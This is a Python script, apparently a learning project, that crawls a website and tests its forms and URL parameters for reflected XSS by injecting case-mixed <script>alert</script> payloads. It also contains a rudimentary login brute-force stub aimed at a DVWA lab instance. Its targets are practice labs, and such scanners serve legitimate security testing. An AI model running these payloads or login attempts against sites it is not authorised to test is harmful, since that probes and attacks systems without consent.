#Import the necessary libs

import requests
import re
import urllib.parse as urlparse
import bs4

#The VulnerabilityScanner body 
class VulnerabilityScanner:
    """
        Create a VulnerabilityScanner object to scan a whole website from xss vulnerability.
        This class will discover all web pages in a website and extract all links and forms inside it and test all possible xss vulnerability.

    """
    #The constractor part it well get in argument the target website url
    def __init__(self , url):
        self.session = requests.Session()#create the current session
        self.target_url = url#the target website url
        self.target_links = []#list of links found in in target website
        self.links_to_ignore = ['http://testphp.vulnweb.com/logout.php' , 'http://192.168.1.13/dvwa/logout.php' , 'http://labs.iisecurity.in/DVWA/logout.php']
        self.vulnerable_links =[]
        self.vulnerable_forms = {}
       
    
    #This method well extract links from target website 
    #It wel search for the '<a>' tag and it well extract the url from it using RegEx
    #Exp: <a href="https://www.me.com">mylink<a/> ==>  https://www.me.com
    def extract_links(self , url):
        
        try:
            result = self.session.get(url).text#send a request to the target website and recover the html body of the target website and decode it
        except Exception as e:
            print("Erorr in extract_links method :")
            print(e)
            
        return re.findall('(?:href=")(.*?)"' , result)#extract all link in the body of the respons and return it as list


    #This method well crawl the target website recursively to extract all link inside the website
    def crawl(self , url=None):#if the url parameter is not definded it well have the None value in default

        #If url equal to None that's mean that this is the first call of the crawl method ,so we should assign the target url to url  
        if url == None:
            url = self.target_url
        

        #Call the extract_links to extract link from the web page
        href_links = self.extract_links(url)  
        
        #Combine the principal link with the sublink to be accesibl
        for link in href_links:
            
            link = urlparse.urljoin(self.target_url,link)
            #If the sublink contain '#' we should extract it without the '#' symbole
            if '#' in link:
                link = link.split("#")[0]

            #Check that the principal link inside the new link and the new link dosn't exist int the links list to avoid redundancy
            if self.target_url in link and link not in self.target_links and link not in self.links_to_ignore:
                self.target_links.append(link)#appand the new link to the list of links
                print(link)#print the new added link
                self.crawl(link)#call recursively the Crawl method to deal with any possibility

    #This method well extract all forms from a webpage.
    #It well return a list of forms
    def extract_forms(self,link):
        try:
            pageCode = self.session.get(link).text
        except Exception as e:
            print("Erorr in extract_forms method :")
            print(e)
        pageCode = bs4.BeautifulSoup(pageCode , features="html.parser")
        return pageCode.find_all("form")

    #This method well 
    def submit_form(self,form , valueToSubmit , linkExtractedFrom):
        action = form.get("action")
        print("[+] Action ==> ",action)

        post_url = urlparse.urljoin(linkExtractedFrom,action)

        method = form.get("method")
        print("[+] Method ==> ",method)

        inputList = form.find_all("input")

        post_data = {}
        input_number = 1
        
        for input in inputList:
            print("-"*13+" INPUT {} ".format(input_number)+"-"*20)
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = valueToSubmit
            
            print("[+] Name\t==>\t",input_name)
            print("[+] Type\t==>\t",input_type)
            print("[+] Value\t==>\t",input_value)

            post_data[input_name] = input_value

            input_number +=1

        try:
            if method == "post":    
                return self.session.post(post_url,data=post_data )
            return self.session.get(post_url , params=post_data )
        except Exception as e:
            print("Erorr in submit form method From line 98 .. 100")
            print(e)





    """def login_brutforce(self):
        data_dict = {
            "uname"  :   "test",
            "pass"  :   "test",
            "submit"     :   "login"
        }
        res = self.session.post("http://testphp.vulnweb.com/login.php" , data=data_dict , headers={
"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
})
        print(res.text)"""

   

    def login_brutforce(self , usr, pas):
        data_dict = {
        "username"  :   'admin',
        "password"  :   '',
        "Login"     :   "Login"
        }
        res = self.session.post("http://192.168.1.14/dvwa/login.php" , data=data_dict )
        print(res.text)
        
    def Run(self):
        print("-"*10+" list of links "+'-'*10)
        self.crawl(self.target_url)
        print("-"*20)
        print()
        #self.crawl(self.target_url)
        for link in self.target_links:
            for form in self.extract_forms(link):
                print("[***] Testing Form in "+link)
                #calling all methods we well implement later
                #eq:
                if self.test_xss_in_forms(form , link):
                 
                    print("[!!!] vernuable form found " , link)
                print("#"*70)

            if '=' in link:
                print()
                print("[***] Testing Link in "+link)
                #calling all methods we well implement later
                if self.test_xxs_in_link(link):
                    print("[!!!]vernuable link found " , link)
                   
                print("#"*70)
        

        return (self.target_links , self.vulnerable_links , self.vulnerable_forms)
           

    def test_xss_in_forms(self , form , link_of_form):
        xss_script_test = '<scrIpt>alert("yes");</scrIpt>'
        body = self.submit_form(form , xss_script_test , link_of_form)
        if xss_script_test in body.text:
            print(f"[+] {link_of_form} ===> is vulnerable")
            self.vulnerable_forms[link_of_form] = form
            return True
        return False

    def test_xxs_in_link(self,link_of_form):
        xss_test_script = "<sCript>alert('test')</scriPt>"
        link_of_form = link_of_form.replace("=", "=" + xss_test_script)
        response = self.session.get(link_of_form)
        if xss_test_script in response.text:
            print(f"[+] {link_of_form} ===> is vulnerable")
            self.vulnerable_links.append(link_of_form)
            return True
        return False

